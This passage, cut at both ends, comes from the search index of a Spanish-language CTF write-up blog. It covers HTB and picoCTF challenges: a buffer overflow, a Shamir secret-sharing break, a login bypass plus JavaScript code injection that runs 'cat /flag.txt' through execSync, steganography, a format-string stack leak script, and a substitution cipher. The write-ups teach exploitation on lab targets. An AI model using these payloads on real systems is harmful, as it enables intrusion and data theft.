desarrollar el exploit. Podemos probarlo en local:\n$ python3 solve.py [*] './sp_going_deeper' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' [+] Starting local process './sp_going_deeper': pid 39473 [+] Flag: HTB{f4k3_fl4g_f0r_t35t1ng} [*] Stopped process './sp_going_deeper' (pid 39473)  Y funciona, vamos a ver en remoto:\n$ python3 solve.py 142.93.40.15:32536 [*] './sp_going_deeper' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' [+] Opening connection to 142.93.40.15 on port 32536: Done [+] Flag: HTB{d1g_1n51d3..u_Cry_cry_cry} [*] Closed connection to 142.93.40.15 port 32536  El exploit completo se puede encontrar aquí: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/pwn/space-pirate-going-deeper/","section":"ctf","summary":"Binario de 64 bits. Buffer Overflow. Control del flujo de ejecución del programa","time":4,"title":"Space pirate: Going Deeper"},{"contents":"Se nos proporciona el siguiente código en Python:\nfromsympyimport* fromhashlibimportmd5 fromCrypto.CipherimportAES fromCrypto.Util.Paddingimportpad fromrandomimportrandint, randbytes, seed FLAG=b'HTB{dummyflag}' classShamir: def__init__(self, prime, k, n): self.p=prime self.secret=randint(1, self.p-1) self.k=k self.n=n self.coeffs=[self.secret] self.x_vals=[] self.y_vals=[] defnext_coeff(self, val): returnint(md5(val.to_bytes(32, byteorder='big')).hexdigest(), 16) defcalc_coeffs(self): foriinrange(1, self.n+1): self.coeffs.append(self.next_coeff(self.coeffs[i-1])) defcalc_y(self, x): y=0 fori, coeffinenumerate(self.coeffs): y+=coeff*x**i returny%self.p defcreate_pol(self): self.calc_coeffs() self.coeffs=self.coeffs[:self.k] for_inrange(self.n): x=randint(1, self.p-1) self.x_vals.append(x) self.y_vals.append(self.calc_y(x)) defget_share(self): returnself.x_vals[0], self.y_vals[0] defmain(): sss=Shamir(92434467187580489687, 10, 18) sss.create_pol() share=sss.get_share() seed(sss.secret) key=randbytes(16) cipher=AES.new(key, AES.MODE_ECB) enc_FLAG=cipher.encrypt(pad(FLAG, 16)).hex() print(sss.coeffs) f=open('msg.enc', 'w') f.write('share: '+str(share) +'\\n') f.write('coefficient: '+str(sss.coeffs[1]) +'\\n') f.write('secret message: '+str(enc_FLAG) +'\\n') f.close() if__name__=='__main__': main()  Y este es el resultado:\nshare: (21202245407317581090, 11086299714260406068) coefficient: 93526756371754197321930622219489764824 secret message: 1aaad05f3f187bcbb3fb5c9e233ea339082062fc10a59604d96bcc38d0af92cd842ad7301b5b72bd5378265dae0bc1c1e9f09a90c97b35cfadbcfe259021ce495e9b91d29f563ae7d49b66296f15e7999c9e547fac6f1a2ee682579143da511475ea791d24b5df6affb33147d57718eaa5b1b578230d97f395c458fc2c9c36525db1ba7b1097ad8f5df079994b383b32695ed9a372ea9a0eb1c6c18b3d3d43bd2db598667ef4f80845424d6c75abc88b59ef7c119d505cd696ed01c65f374a0df3f331d7347052faab63f76f587400b6a6f8b718df1db9cebe46a4ec6529bc226627d39baca7716a4c11be6f884c371b08d87c9e432af58c030382b737b9bb63045268a18455b9f1c4011a984a818a5427231320ee7eca39bdfe175333341b7c  Se está utilizando Shamir Secret Sharing (SSS) para obtener un valor compartido e inicializar random.seed, de manera que la clave para un cifrado AES es \u0026ldquo;aleatoria\u0026rdquo;. Luego, se cifra la flag con AES.\nEsta vez, los parámetros de SSS son $p = 92434467187580489687$, $k = 10$ y $n = 18$. Entonces, el servidor creará un polinomio $P \\in \\mathbb{Z}/p\\mathbb{Z}[x]$ como este:\n$$ P(x) = s + a_1 x + a_2 x^2 + a_3 x^3 + \\dots + a_k x^k $$\nEl secreto está denotado por $s$ (el término independiente).\nLuego, el servidor calcula algunas parejas $(x_i, P(x_i))$. De hecho, desde $(x_1, P(x_1))$ hasta $(x_n, P(x_n))$.\nEl valor compartido que nos da el programa es $(x_1, P(x_1))$. También sabemos el coeficiente $a_1$.\nLa vulnerabilidad aquí es que los coeficientes $a_i$ están relacionados:\ndefnext_coeff(self, val): returnint(md5(val.to_bytes(32, byteorder='big')).hexdigest(), 16) defcalc_coeffs(self): foriinrange(1, self.n+1): self.coeffs.append(self.next_coeff(self.coeffs[i-1]))  Entonces, $a_{i + 1} = \\mathrm{MD5}(a_i)$. Considerando que sabemos $a_1$, podemos calcular $a_2$, luego $a_3$, y por inducción $a_k$\u0026hellip; Por lo que tenemos todos los coeficientes del polinomio $P$ excepto el término independiente $s$.\nEl hecho de tener todos los valores $a_i$ es útil porque también tenemos $(x_1, P(x_1))$, así que podemos resolver la siguiente ecuación en $s$, que es la única incógnita:\n$$ P(x_1) = s + a_1 x_1 + a_2 x_1^2 + \\dots + a_k x_1^k $$\nPor tanto\n$$ s = P(x_1) - a_1 x_1 - a_2 x_1^2 - \\dots - a_k x_1^k $$\nY una vez que tenemos $s$, podemos inicializar random.seed y obtener la misma clave \u0026ldquo;aleatoria\u0026rdquo; que se usó con el cifrado AES y descifrar el texto que nos dan para obtener la flag.\nTodos los cálculos están escritos en el siguiente script en Python: solve.py:\n$ python3 solve.py The treasure is located at galaxy VS-708. Our team needs 3 light years to reach it. Our solar cruise has its steam canons ready to fire in case we encounter enemies. Next time you will hear from us brother, everyone is going to be rich! HTB{1_d1dnt_kn0w_0n3_sh4r3_w45_3n0u9h!1337}  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/crypto/space-pirates/","section":"ctf","summary":"Shamir Secret Sharing. Semilla de PRNG","time":2,"title":"Space Pirates"},{"contents":"Se nos proporciona el código fuente de un proyecto web en Node.js con Express JS y MySQL. En el Dockerfile se utiliza el siguiente script entrypoint.sh:\n#!/bin/ash # Secure entrypoint chmod 600 /entrypoint.sh # Initialize \u0026amp; Start MariaDB mkdir -p /run/mysqld chown -R mysql:mysql /run/mysqld mysql_install_db --user=mysql --ldata=/var/lib/mysql mysqld --user=mysql --console --skip-name-resolve --skip-networking=0 \u0026amp; # Wait for mysql to start while ! mysqladmin ping -h'localhost' --silent; do echo \"mysqld is not yet alive\" \u0026amp;\u0026amp; sleep .2; done # admin password PASSWORD=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1) # create database mysql -u root \u0026lt;\u0026lt; EOF CREATE DATABASE spiky_tamagotchi; CREATE TABLE spiky_tamagotchi.users ( id INT AUTO_INCREMENT NOT NULL, username varchar(255) UNIQUE NOT NULL, password varchar(255) NOT NULL, PRIMARY KEY (id) ); INSERT INTO spiky_tamagotchi.users VALUES (1,'admin','${PASSWORD}'); GRANT ALL PRIVILEGES ON spiky_tamagotchi.* TO 'rh0x01'@'%' IDENTIFIED BY 'r4yh4nb34t5b1gm4c'; FLUSH PRIVILEGES; EOF # launch supervisord /usr/bin/supervisord -c /etc/supervisord.conf  Aquí vemos que la base de datos contiene un usuario llamado admin y una contraseña aleatoria.\nExisten funciones llamadas registerUser y loginUser en el código fuente (database.js). Ambas usan prepared statements, por lo que no es posible usar una inyección de código SQL:\nlet mysql = require('mysql') class Database { constructor() { this.connection = mysql.createConnection({ host: 'localhost', user: 'rh0x01', password: 'r4yh4nb34t5b1gm4c', database: 'spiky_tamagotchi' }); } async registerUser(user, pass) { return new Promise(async (resolve, reject) =\u0026gt; { let stmt = 'INSERT INTO users (username, password) VALUES (?, ?)'; this.connection.query(stmt, [user, pass], (err, result) =\u0026gt; { if(err) reject(err) resolve(result) }) }); } async loginUser(user, pass) { return new Promise(async (resolve, reject) =\u0026gt; { let stmt = 'SELECT username FROM users WHERE username = ? AND password = ?'; let x = this.connection.query(stmt, [user, pass], (err, result) =\u0026gt; { if(err || result.length == 0) reject(err) resolve(result) }) }); } } module.exports = Database;  Desafortunadamente, no hay manera de registrar un nuevo usuario usando registerUser:\nconst express = require('express') const router = express.Router() const JWTHelper = require('../helpers/JWTHelper') const SpikyFactor = require('../helpers/SpikyFactor') const AuthMiddleware = require('../middleware/AuthMiddleware') const response = data =\u0026gt; ({ message: data }) router.get('/', (req, res) =\u0026gt; { return res.render('index.html') }) router.post('/api/login', async (req, res) =\u0026gt; { const { username, password } = req.body if (username \u0026amp;\u0026amp; password) { return db .loginUser(username, password) .then(user =\u0026gt; { let token = JWTHelper.sign({ username: user[0].username }) res.cookie('session', token, { maxAge: 3600000 }) return res.send(response('User authenticated successfully!')) }) .catch(() =\u0026gt; res.status(403).send(response('Invalid username or password!'))) } return res.status(500).send(response('Missing required parameters!')) }) router.get('/interface', AuthMiddleware, async (req, res) =\u0026gt; { return res.render('interface.html') }) router.post('/api/activity', AuthMiddleware, async (req, res) =\u0026gt; { const { activity, health, weight, happiness } = req.body if (activity \u0026amp;\u0026amp; health \u0026amp;\u0026amp; weight \u0026amp;\u0026amp; happiness) { return SpikyFactor.calculate(activity, parseInt(health), parseInt(weight), parseInt(happiness)) .then(status =\u0026gt; { return res.json(status) }) .catch(e =\u0026gt; { res.send(response('Something went wrong!')) }) } return res.send(response('Missing required parameters!')) }) router.get('/logout', (req, res) =\u0026gt; { res.clearCookie('session') return res.redirect('/') }) module.exports = database =\u0026gt; { db = database return router }  Por tanto, tenemos que saltarnos la autenticación de alguna manera. Aquí tenemos helpers/JWTHelper.js, que es la manera en la que el servidor gestiona la autenticación:\nconst jwt = require('jsonwebtoken'); const crypto = require('crypto'); const APP_SECRET = crypto.randomBytes(69).toString('hex'); module.exports = { sign(data) { data = Object.assign(data); return (jwt.sign(data, APP_SECRET, { algorithm:'HS256' })) }, async verify(token) { return (jwt.verify(token, APP_SECRET, { algorithm:'HS256' })); } }  Es extraño ver Object.assign(data), que puede recordar a Prototype Pollution, pero no es explotable.\nAdemás, existe otra función en helpers/SpikyFactor.js:\nconst calculate = (activity, health, weight, happiness) =\u0026gt; { return new Promise(async (resolve, reject) =\u0026gt; { try { // devine formula :100: let res = `with(a='${activity}', hp=${health}, w=${weight}, hs=${happiness}) { if (a == 'feed') { hp += 1; w += 5; hs += 3; } if (a == 'play') { w -= 5; hp += 2; hs += 3; } if (a == 'sleep') { hp += 2; w += 3; hs += 3; } if ((a == 'feed' || a == 'sleep' ) \u0026amp;\u0026amp; w \u0026gt; 70) { hp -= 10; hs -= 10; } else if ((a == 'feed' || a == 'sleep' ) \u0026amp;\u0026amp; w \u0026lt; 40) { hp += 10; hs += 5; } else if (a == 'play' \u0026amp;\u0026amp; w \u0026lt; 40) { hp -= 10; hs -= 10; } else if ( hs \u0026gt; 70 \u0026amp;\u0026amp; (hp \u0026lt; 40 || w \u0026lt; 30)) { hs -= 10; } if ( hs \u0026gt; 70 ) { m = 'kissy' } else if ( hs \u0026lt; 40 ) { m = 'cry' } else { m = 'awkward'; } if ( hs \u0026gt; 100) { hs = 100; } if ( hs \u0026lt; 5) { hs = 5; } if ( hp \u0026lt; 5) { hp = 5; } if ( hp \u0026gt; 100) { hp = 100; } if (w \u0026lt; 10) { w = 10 } return {m, hp, w, hs} }`; quickMaths = new Function(res); const {m, hp, w, hs} = quickMaths(); resolve({mood: m, health: hp, weight: w, happiness: hs}) } catch (e) { reject(e); } }); } module.exports = { calculate }  Esta es solo accesible una vez que estemos autenticados, pero podemos ver la vulnerabilidad. El problem es que la variable res contiene una string que interpola algunas variables que podemos controlar. Esta string se utiliza para crear una función de JavaScript en tiempo de ejecución, por lo que podemos modificar un poco el código de la función para ejecutar un comando de sistema y leer la flag.\nPara poder saltarnos la autenticación, vamos a añadir algunos console.log para analizar lo que está pasando:\nconsole.log(req.body, username \u0026amp;\u0026amp; password)  console.log(x.sql)  Esta es la página de inicio de sesión:\nY capturamos la petición con Burp Suite:\nY vemos esto en la salida de las sentencias console.log:\n{ username: 'admin', password: 'asdf' } asdf SELECT username FROM users WHERE username = 'admin' AND password = 'asdf'  Ahora podemos probar con este documento JSON (intentando alga especi de vulnerabilidad de Type Juggling):\n{\"username\":\"admin\",\"password\":true}  { username: 'admin', password: true } true SELECT username FROM users WHERE username = 'admin' AND password = true  Luego, este:\n{\"username\":\"admin\",\"password\":1}  { username: 'admin', password: 1 } 1 SELECT username FROM users WHERE username = 'admin' AND password = 1  Otro más:\n{\"username\":\"admin\",\"password\":[]}  { username: 'admin', password: [] } [] SELECT username FROM users WHERE username = 'admin' AND password =  Y por último, este:\n{\"username\":\"admin\",\"password\":[0]}  { username: 'admin', password: [ 0 ] } [ 0 ] SELECT username FROM users WHERE username = 'admin' AND password = 0  Sorprendentemente nos hemos saltado la autenticación y ya con esto estamos autenticados:\nAhora tenemos esta página web:\nA continuación, capturamos la petición con Burp Suite:\nY usamos el siguiente payload para inyectar código JavaScript y ejecutar un comando de sistema para leer la flag (adaptado de un payload de Server-Side Template Injection en Less.js de PayloadsAllTheThings):\n', hp=60, w=42, hs=50) { hp=global.process.mainModule.require('child_process').execSync('cat /flag.txt').toString(); return {a, hp, w, hs} //  Este payload funciona porque la función de JavaScript que será creada es esta:\nwith(a='', hp=60, w=42, hs=50) { hp=global.process.mainModule.require('child_process').execSync('cat /flag.txt').toString(); return{a, hp, w, hs} //', hp=52, w=37, hs=43) {  Y conseguimos la flag en local:\nSi realizamos los pasos anteriores en la instancia remota, capturaremos la flag (HTB{s0rry_1m_n07_1nt0_typ3_ch3ck5}):\nSolo por curiosidad, podemos ver que el bypass de autenticación funciona en MySQL al consultar por password = 0, aunque password sea un campo de tipo varchar:\n$ docker exec -it d8ab08dc320a mysql Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 7 Server version: 10.6.7-MariaDB MariaDB Server Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MariaDB [(none)]\u0026gt; use spiky_tamagotchi; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [spiky_tamagotchi]\u0026gt; select * from users where username = 'admin' and password = 0; +----+----------+------------------+ | id | username | password | +----+----------+------------------+ | 1 | admin | LrQ0SQr9kjcs0iBA | +----+----------+------------------+ 1 row in set, 1 warning (0.002 sec) MariaDB [spiky_tamagotchi]\u0026gt; exit Bye  ","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/spiky-tamagotchi/","section":"ctf","summary":"Bypass de autenticación. Inyección de código JavaScript","time":5,"title":"Spiky Tamagotchi"},{"contents":"Tenemos una imagen PNG llamada pico.flag.png:\nComo el reto se llama St3g0, parece que la imagen tiene datos ocultos mediante esteganografía. Podemos utilizar zsteg para mostrar la flag:\n$ zsteg pico.flag.png b1,r,lsb,xy .. text: \"~__BwV_G@\" b1,rgb,lsb,xy .. text: \"picoCTF{7h3r3_15_n0_5p00n_96ae0ac1}$t3g0\" b1,abgr,lsb,xy .. text: \"E2A5q4E%uSA\" b2,b,lsb,xy .. text: \"AAPAAQTAAA\" b2,b,msb,xy .. text: \"HWUUUUUU\" b2,a,lsb,xy .. file: Matlab v4 mat-file (little endian) \u0026gt;\u0026lt;?P, numeric, rows 0, columns 0 b2,a,msb,xy .. file: Matlab v4 mat-file (little endian) | \u0026lt;?, numeric, rows 0, columns 0 b3,r,lsb,xy .. file: gfxboot compiled html help file b4,r,lsb,xy .. file: Targa image data (16-273) 65536 x 4097 x 1 +4352 +4369 - 1-bit alpha - right \"\" b4,g,lsb,xy .. file: 0420 Alliant virtual executable not stripped b4,b,lsb,xy .. file: Targa image data - Map 272 x 17 x 16 +257 +272 - 1-bit alpha \"\" b4,bgr,lsb,xy .. file: Targa image data - Map 273 x 272 x 16 +1 +4113 - 1-bit alpha \"\" b4,rgba,lsb,xy .. file: Novell LANalyzer capture file b4,rgba,msb,xy .. file: Applesoft BASIC program data, first line number 8 b4,abgr,lsb,xy .. file: Novell LANalyzer capture file  Y la flag es: picoCTF{7h3r3_15_n0_5p00n_96ae0ac1}.\n","image":"/images/forensics.png","permalink":"https://7rocky.github.io/ctf/picoctf/forensics/st3g0/","section":"ctf","summary":"picoCTF 2022. 300 puntos. Esteganografía en una imagen","time":0,"title":"St3g0"},{"contents":"Se nos da el código fuente en C de un binario. El código es relativamente largo, por lo que se muestra la función más interesante:\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;time.h\u0026gt; #define FLAG_BUFFER 128 #define MAX_SYM_LEN 4 typedef struct Stonks { int shares; char symbol[MAX_SYM_LEN + 1]; struct Stonks *next; } Stonk; typedef struct Portfolios { int money; Stonk *head; } Portfolio; int buy_stonks(Portfolio *p) { if (!p) { return 1; } char api_buf[FLAG_BUFFER]; FILE *f = fopen(\"api\", \"r\"); if (!f) { printf(\"Flag file not found. Contact an admin.\\n\"); exit(1); } fgets(api_buf, FLAG_BUFFER, f); int money = p-\u0026gt;money; int shares = 0; Stonk *temp = NULL; printf(\"Using patented AI algorithms to buy stonks\\n\"); while (money \u0026gt; 0) { shares = (rand() % money) + 1; temp = pick_symbol_with_AI(shares); temp-\u0026gt;next = p-\u0026gt;head; p-\u0026gt;head = temp; money -= shares; } printf(\"Stonks chosen\\n\"); // TODO: Figure out how to read token from file, for now just ask char *user_buf = malloc(300 + 1); printf(\"What is your API token?\\n\"); scanf(\"%300s\", user_buf); printf(\"Buying stonks with token:\\n\"); printf(user_buf); // TODO: Actually use key to interact with API view_portfolio(p); return 0; }  Aquí tenemos una vulnerabilidad de Format String:\nchar *user_buf = malloc(300 + 1); printf(\"What is your API token?\\n\"); scanf(\"%300s\", user_buf); printf(\"Buying stonks with token:\\n\"); printf(user_buf);  Vamos a probar en la instancia remota:\n$ nc mercury.picoctf.net 16439 Welcome back to the trading app! What would you like to do? 1) Buy some stonks! 2) View my portfolio 1 Using patented AI algorithms to buy stonks Stonks chosen What is your API token? %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x Buying stonks with token: 940c4b0.804b000.80489c3.f7f0ad80.ffffffff.1.940a160.f7f18110.f7f0adc7.0.940b180.1 Portfolio 1 shares of NXZ 1 shares of RZ 7 shares of V 8 shares of Q 1 shares of NOC 10 shares of PW 6 shares of BC 34 shares of AS 64 shares of MB 71 shares of VD 46 shares of F 73 shares of WM 145 shares of IPA 1395 shares of L Goodbye!  Estos números hexadecimales son valores fugados de la pila (stack):\n940c4b0.804b000.80489c3.f7f0ad80.ffffffff.1.940a160.f7f18110.f7f0adc7.0.940b180.1  Existe otro trozo de código útil en la función anterior:\nchar api_buf[FLAG_BUFFER]; FILE *f = fopen(\"api\", \"r\"); if (!f) { printf(\"Flag file not found. Contact an admin.\\n\"); exit(1); } fgets(api_buf, FLAG_BUFFER, f);  Básicamente, está cargando el contenido del archivo que contiene la flag (llamado api) en la variable api_buf. Como es una variable local, estará almacenada en la pila. Por tanto, la idea es fugar el valor de api_buf utilizando la vulnerabilidad de Format String.\nUna lista de formatos %x funciona bien, pero para ser más específicos, podemos utilizar %1$x para extraer el primer valor de la pila, %2$x para el segundo y así sucesivamente.\nPara ello, podemos utilizar un script en Python que coja los primeros 30 valores:\n#!/usr/bin/env python3 from pwn import context, remote def dump(n: int) -\u0026gt; str: p = remote('mercury.picoctf.net', 16439) p.sendlineafter(b'2) View my portfolio', b'1') p.sendlineafter(b'What is your API token?', f'%{n}$x'.encode()) p.recvuntil(b'Buying stonks with token:\\n') leak = p.recvuntil(b'\\n').decode() p.close() return leak.strip() def main(): context.log_level = 'CRITICAL' for i in range(30): print(i + 1, dump(i + 1)) if __name__ == '__main__': main()  $ python3 solve.py 1 99ca3f0 2 804b000 3 80489c3 4 f7f96d80 5 ffffffff 6 1 7 99dd160 8 f7efe110 9 f7f97dc7 10 0 11 9b85180 12 1 13 9d80410 14 87ca430 15 6f636970 16 7b465443 17 306c5f49 18 345f7435 19 6d5f6c6c 20 306d5f79 21 5f79336e 22 62633763 23 65616336 24 ffa3007d 25 f7f48af8 26 f7f94440 27 7249cc00 28 1 29 0 30 f7d9dbe9  Sabemos que las flags de picoCTF tienen un formato particular (picoCFT{...}). Los primeros cuatro caracteres son pico que en hexadecimal sería 0x6f636970 (formato little-endian). Este valor está en la posición 15 del resultado anterior.\nEl código ASCII para } es 0x7d que aparece en la posición 24. La flag está entre las posiciones 15 y 24. Como las posiciones no cambiarán, podemos tomar estos valores y decodificarlos byte por byte. De hecho, vamos a extraer hasta la posición 23, ya que en la 24 solo está } y el byte nulo (que termina la cadena de caracteres en C):\ndef main(): flag = b'' for i in range(15, 24): flag += p32(int(dump(i), 16)) flag += b'}' print(f'Leaked flag: {flag.decode()}') if __name__ == '__main__': main()  Y aquí tenemos la flag:\n$ python3 solve.py Leaked flag: picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/picoctf/binary-exploitation/stonks/","section":"ctf","summary":"picoCTF 2021. 20 puntos. Binario de 32 bits. Format String. Fugas de memoria","time":3,"title":"Stonks"},{"contents":"Se nos proporciona este texto cifrado:\nMIT YSAU OL OYGFSBDGRTKFEKBHMGCALSOQTMIOL. UTFTKAMTR ZB DAKQGX EIAOF GY MIT COQOHTROA HAUT GF EASXOF AFR IGZZTL. ZT CTKT SGFU, MIT YSACL GF A 2005 HKTLTFM MODTL MIAF LMADOFA GK A CTTQSB LWFRAB, RTETDZTK 21, 1989 1990, MIT RKTC TROMGKL CAL WHKGGMTR TXTKB CGKSR EAF ZT YGWFR MIT EGFMOFWTR MG CGKQ AM A YAOMIYWS KTHSOTL CITKT IGZZTL, LMBST AOD EASXOF, AMMAEQ ZGMI LORTL MG DAKQL, \"CIAM RG EGFMKGSSOFU AF AEMWAS ZGAKR ZGVTL OF MIT HKTHAKTFML FADT, OL ODHWSLOXT KADHAUTL OF CIOEI ASCABL KTYTKTFETL MIT HALLCGKR, CIOEI DGFTB, AFR MITB IAR SOMMST YKGFM BAKR IOL YKWLMKAMTR EGSGK WFOJWT AZOSOMB COMI AFR OFROLHTFLAMT YGK MTAEI GMITK LMWROTL, AKT ACAKRL ZARUTL, HWZSOLITR ZTYGKT CTSS AL A YOKT UKGLL HSAFL CTKT GKOUOFASSB EIAKAEMTKL OF MIT LMKOH MG CIOEI LTTD MG OM CITF MTDHTKTR OF AFR IASSGCOFU MITB'KT LODHSB RKACOFU OF UOXTL GF\" HKOFEOHAS LHOMMST ROLMGKM, KTARTKL EGDOEL AKT WLT, CAMMTKLGF MGGQ MCG 16-DGFMIL AYMTK KTLOLMAQTL A DGKT EKTAM RTAS MG EASXOF GYMTF IGZZTL MG ARDOML \"LSODB, \"ZWM OM'L FADTR A FOUIM GWM LIT OL HGOFM GY FGM LTTF IGZZTL MIT ZGGQL AM MIAM O KTDAOFOFU ZGGQ IADLMTK IWTB AKT AHHTAKAFET: RTETDZTK 6, 1995 DGD'L YKADTL GY EASXOF UOXTF A CAUGF, LGDTMODTL MIAM LG OM'L YAMITKT'L YADOSB FG EAFETSSAMOGFLIOH CAL HKTLTFML YKGD FGXTDZTK 21, 1985 SALM AHHTAK AZLTFET OF AFGMITKCOLT OM IAHHB MG KWF OM YGK MIOL RAR AL \"A SOMMST MG MGSTKAMT EASXOF'L YADOSB RKACF ASDGLM EGDDTFRTR WH ZTOFU HTGHST OFLMAFET, UTM DAKKOTR ZB A RAFET EASXOF'L GWMSAFROLOFU MIT FTCLHAHTK GK MAZSGOR FTCLHAHTK ZWLOFTLL LIGC OL GF!\" AFR LHKOFML GY EIOSRKTF'L RAR'L YKWLMKAMTR ZB MWKF IWDGK, CAL HWZSOE ROASGU MITKT'L FGM DWEI AL \"'94 DGRTKFOLD\" CAMMTKLGF IAL RTSOUIML GY YAFMALB SOYT CAMMTKLGF LABL LTKXTL AL AF AKMOLML OL RTLMKWEMOGF ZWLOFTLL, LHAETYAKTK GY MIT GHHGKMWFOMOTL BGW ZGMI A MGHOE YGK IOL IGDT MGFUWT-OF-EITTQ HGHWSAK MIAM OM CAL \"IGF\" AFR JWAKMTK HAUT DGKT LHAEOGWL EAFETSSAMOGF MIT HAOK AKT ESTAKSB OF HLBEIOE MKAFLDGUKOYOTK'L \"NAH\" LGWFR TYYTEM BGW MIOFQTK CAMMTKLGF ASLG UKTC OFEKTROZST LHAET ZWBL OF EGDDGFSB CIOST GMITKCOLT OM'L FADT OL FGMAZST LMGKBSOFT UAXT MIT GHHGKMWFOMOTL BGW EAFETSSAMOGF MIT \"EASXOF GYYTK MG DAQT IOD OFEGKKTEM AFLCTKL CAMMTK AKMCGKQ GMITK GYMTF CIOEI OL TXORTFM MG GMITK LMKOH OL MG MITOK WLT GY KWSTL MIAM LIGCF GF LAFROYTK, CIG WLTL A EKGCJWOSS ZT LTTF \"USWTR\" MG MIT GFSB HTKL AFR IOL YAMITK LWHHGKM OL SWFEISOFT UAXT MITLT MIOF A BTAK OF DWSMODAMTKOAS AFR GZMAOF GF LAFMALB, IOL WLT, CAMMTKL ROASGUWT OL AF \"AKMOLM'L LMAMWL AL \"A ROD XOTC OF MIT TLLTFMOASSB MG DAQT IOD LTTD MG OFESWRTR MIAM EASXOF OL AF GRR ROASGUWT DGLM GY MIT ESWZ IAL TVHKTLLOGF GWMLORT AXAOSAZST MG  A partir del nombre del reto, sabemos que el texto está cifrado utilizando sustitución. Podemos probar con ROT13, pero no se descifra. Por tanto, tendremos que deducir cuál es la sustitución de caracteres utilizada. Utilizaré CyberChef para ello.\nPrimero, vemos que el texto comienza por MIT y que hay muchas palabras MIT. Como el código seguramente esté en inglés, la palabra más probable es THE:\nEntonces, M -\u0026gt; T, I -\u0026gt; H y T -\u0026gt; E.\nAhora, vemos que hay muchas A como palabra. Esto significa que A -\u0026gt; A porque solamente existe una palabra de una letra en inglés, y es precisamente A:\nLuego vemos que hay algunos apóstrofes y que normalmente aparecerían como 'S, por lo que L -\u0026gt; S:\nDespuésm podemos observar que hay muchos TG (donde la T ya ha sido sustituida), y esto significa que G -\u0026gt; O porque no hay más palabras de dos letras que empiezen por T salvo TO:\nCon un procrdimiento similar podemos deducir que OS será IS y que OT será IT (de nuevo, la S y la T ya han sido sustituidas), por lo que O -\u0026gt; I:\nAhora somos capaces de ver una frase: ATTAEQ ZOTH SIRES TO DAKQS. Es altamente probable que sea algo como: ATTACK BOTH SIDES TO .... Aquí tenemos E -\u0026gt; C, Q -\u0026gt; K, Z -\u0026gt; B y R -\u0026gt; D:\nAquí tenemos otra palabra reconocible CIKIHEDIA, que es WIKIPEDIA, evidentemente. Por tanto, C -\u0026gt; W y H -\u0026gt; P:\nMirando un poco más, encontramos WEKE, WOKK, DKEW y EDITOKS. Esto significa que K -\u0026gt; R:\nVemos algunas AFD (donde la A y la D ya están sustituidas), por lo que F -\u0026gt; N:\nLuego vemos algunos meses y días entre otras palabras reconocibles, y tenemos W -\u0026gt; U, B -\u0026gt; Y, D -\u0026gt; M y X -\u0026gt; V:\nTres palabras más: UENERATED, WEEKSY y SIMPSY. Por tanto, U -\u0026gt; G y S -\u0026gt; L:\nDe nuevo, utilizando el mismo procedimiento, podemos deducir que Y -\u0026gt; F:\nAunque la flag ya se puede leer, vamos a terminar la sustitución. Vemos que hay algunas palabras más que nos indican que J -\u0026gt; Q, N -\u0026gt; N, V -\u0026gt; X y P -\u0026gt; J (no hay ninguna P y la J es el carácter restante):\nY hemos terminado:\nEl texto descifrado es:\nTHE FLAG IS IFONLYMODERNCRYPTOWASLIKETHIS. GENERATED BY MARKOV CHAIN OF THE WIKIPEDIA PAGE ON CALVIN AND HOBBES. BE WERE LONG, THE FLAWS ON A 2005 PRESENT TIMES THAN STAMINA OR A WEEKLY SUNDAY, DECEMBER 21, 1989 1990, THE DREW EDITORS WAS UPROOTED EVERY WORLD CAN BE FOUND THE CONTINUED TO WORK AT A FAITHFUL REPLIES WHERE HOBBES, STYLE AIM CALVIN, ATTACK BOTH SIDES TO MARKS, \"WHAT DO CONTROLLING AN ACTUAL BOARD BOXES IN THE PREPARENTS NAME, IS IMPULSIVE RAMPAGES IN WHICH ALWAYS REFERENCES THE PASSWORD, WHICH MONEY, AND THEY HAD LITTLE FRONT YARD HIS FRUSTRATED COLOR UNIQUE ABILITY WITH AND INDISPENSATE FOR TEACH OTHER STUDIES, ARE AWARDS BADGES, PUBLISHED BEFORE WELL AS A FIRE GROSS PLANS WERE ORIGINALLY CHARACTERS IN THE STRIP TO WHICH SEEM TO IT WHEN TEMPERED IN AND HALLOWING THEY'RE SIMPLY DRAWING IN GIVES ON\" PRINCIPAL SPITTLE DISTORT, READERS COMICS ARE USE, WATTERSON TOOK TWO 16-MONTHS AFTER RESISTAKES A MORE CREAT DEAL TO CALVIN OFTEN HOBBES TO ADMITS \"SLIMY, \"BUT IT'S NAMED A NIGHT OUT SHE IS POINT OF NOT SEEN HOBBES THE BOOKS AT THAT I REMAINING BOOK HAMSTER HUEY ARE APPEARANCE: DECEMBER 6, 1995 MOM'S FRAMES OF CALVIN GIVEN A WAGON, SOMETIMES THAT SO IT'S FATHERE'S FAMILY NO CANCELLATIONSHIP WAS PRESENTS FROM NOVEMBER 21, 1985 LAST APPEAR ABSENCE IN ANOTHERWISE IT HAPPY TO RUN IT FOR THIS DAD AS \"A LITTLE TO TOLERATE CALVIN'S FAMILY DRAWN ALMOST COMMENDED UP BEING PEOPLE INSTANCE, GET MARRIED BY A DANCE CALVIN'S OUTLANDISING THE NEWSPAPER OR TABLOID NEWSPAPER BUSINESS SHOW IS ON!\" AND SPRINTS OF CHILDREN'S DAD'S FRUSTRATED BY TURN HUMOR, WAS PUBLIC DIALOG THERE'S NOT MUCH AS \"'94 MODERNISM\" WATTERSON HAS DELIGHTS OF FANTASY LIFE WATTERSON SAYS SERVES AS AN ARTISTS IS DESTRUCTION BUSINESS, 